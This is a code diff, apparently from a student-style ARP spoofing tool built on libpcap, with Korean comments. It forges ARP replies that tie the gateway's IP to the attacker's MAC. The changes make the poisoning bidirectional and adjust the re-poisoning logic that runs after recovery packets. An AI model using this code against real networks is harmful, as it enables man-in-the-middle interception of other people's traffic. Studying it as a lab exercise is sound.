@@ -213,17 +213,18 @@ int arp_init(char* ifname, char* sender_addr, char* target_addr) {
 		if(eth->type() == 0x0806)
 		{
 			sender_mac = eth->smac();
-			TABLE2.insert({sender_addr, sender_mac});// sender_addr 변경해야함 이거 충돌날 가능성 큼
+			TABLE2.insert({sender_addr, sender_mac});// sender_addr 문자열을 포인터로 받아서 충돌이 나려니?
 			break;
 		}
-	}
+	}//ok
+
 	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
 	if (handle == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 		return -1;
 	}
 	EthArpPacket packet1;
-	packet1.eth_.dmac_ = Mac(sender_mac); //victim MAC
+	packet1.eth_.dmac_ = sender_mac; //victim MAC
 	packet1.eth_.smac_ = Mac(MY_MAC); //my MAC
 	packet1.eth_.type_ = htons(EthHdr::Arp);
 	packet1.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -235,6 +236,8 @@ int arp_init(char* ifname, char* sender_addr, char* target_addr) {
 	packet1.arp_.sip_ = htonl(Ip(target_addr)); //gateway
 	packet1.arp_.tmac_ = sender_mac; //victim MAC
 	packet1.arp_.tip_ = htonl(Ip(sender_addr)); //victim IP
+	printf("%s, %s", sender_addr, target_addr);
+	
 	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet1), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
@@ -280,6 +283,7 @@ int main(int argc, char* argv[])
 	{
 		IP_GATE.insert({sender[i], target[i]});// sender_addr 변경해야함 이거 충돌날 가능성 큼
 		arp_init(ifname, sender[i], target[i]);
+		arp_init(ifname, target[i], sender[i]);
 	}
 
 	pcap_t* pcap = pcap_open_live(ifname, BUFSIZ, 1, 1000, errbuf);
@@ -303,10 +307,17 @@ int main(int argc, char* argv[])
 			printf("arp recover packet send!!\n");
 			struct ipheader *ip_header = (struct ipheader *)(packet + sizeof(struct EthHdr));
 			Mac sender_mac = eth->smac_;
-			char sender_addr[INET_ADDRSTRLEN];
-			strncpy(sender_addr, inet_ntoa(ip_header->iph_sourceip), INET_ADDRSTRLEN);
-			char target_addr[INET_ADDRSTRLEN];
-			strncpy(target_addr, inet_ntoa(ip_header->iph_destip), INET_ADDRSTRLEN);
+			// char sender_addr[INET_ADDRSTRLEN];
+			// strncpy(sender_addr, inet_ntoa(ip_header->iph_sourceip), INET_ADDRSTRLEN);
+			// char target_addr[INET_ADDRSTRLEN];
+			// strncpy(target_addr, inet_ntoa(ip_header->iph_destip), INET_ADDRSTRLEN);
+			if (inet_ntop(AF_INET, &(ip_header->iph_sourceip), sender_addr, INET_ADDRSTRLEN) == NULL) {
+				perror("inet_ntop");
+			}
+
+			if (inet_ntop(AF_INET, &(ip_header->iph_destip), target_addr, INET_ADDRSTRLEN) == NULL) {
+				perror("inet_ntop");
+			}
 			arp_packet(ifname, sender_addr, target_addr, sender_mac);
 		}
 		else if(eth->type() == 0x0800)
